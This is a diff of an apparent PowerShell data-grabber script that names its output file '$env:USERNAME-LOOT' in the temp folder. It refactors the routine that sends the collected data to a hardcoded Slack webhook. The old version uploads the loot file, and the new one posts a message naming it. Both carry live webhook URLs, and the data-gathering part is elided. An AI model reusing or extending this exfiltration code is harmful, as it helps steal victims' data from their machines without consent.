@@ -1,4 +1,5 @@
 $FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"
+$webhookUrl = "https://hooks.slack.com/services/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"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 # URL : https://tinyurl.com/grabber3
@@ -69,35 +70,25 @@ $output > $FileName
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-function Upload-Slack {
-    [CmdletBinding()]
+function Send-SlackMessage {
     param (
-        [parameter(Position=0, Mandatory=$false)]
-        [string]$text,
-        [parameter(Position=1, Mandatory=$false)]
-        [string]$file
+        [Parameter(Mandatory = $true)]
+        [string]$Message
     )
 
-    $webhookUrl = "https://hooks.slack.com/services/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"  # Slack webhook URL 설정
-
     $payload = @{
-        'text' = $text
-    }
+        "text" = $Message
+    } | ConvertTo-Json
 
-    if (-not [string]::IsNullOrEmpty($text)) {
-        Invoke-RestMethod -ContentType 'application/json' -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json)
-    }
-
-    if (-not [string]::IsNullOrEmpty($file)) {
-        $fileBytes = [System.IO.File]::ReadAllBytes($file)
-        $fileName = [System.IO.Path]::GetFileName($file)
-
-        Invoke-RestMethod -Uri "$webhookUrl/files.upload" -Method Post -InFile $file -ContentType 'multipart/form-data' -Headers @{ "filename" = $fileName }
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+    } catch {
+        Write-Error "Failed to send Slack message: $_"
     }
 }
 
 # ...
 
-if (-not [string]::IsNullOrEmpty($dc)) {
-    Upload-Slack -file "$FileName" -text "Data is ready"  # Slack 메시지 전송
+if (-not ([string]::IsNullOrEmpty($dc))) {
+    Send-SlackMessage -Message "File Upload: $FileName"
 }
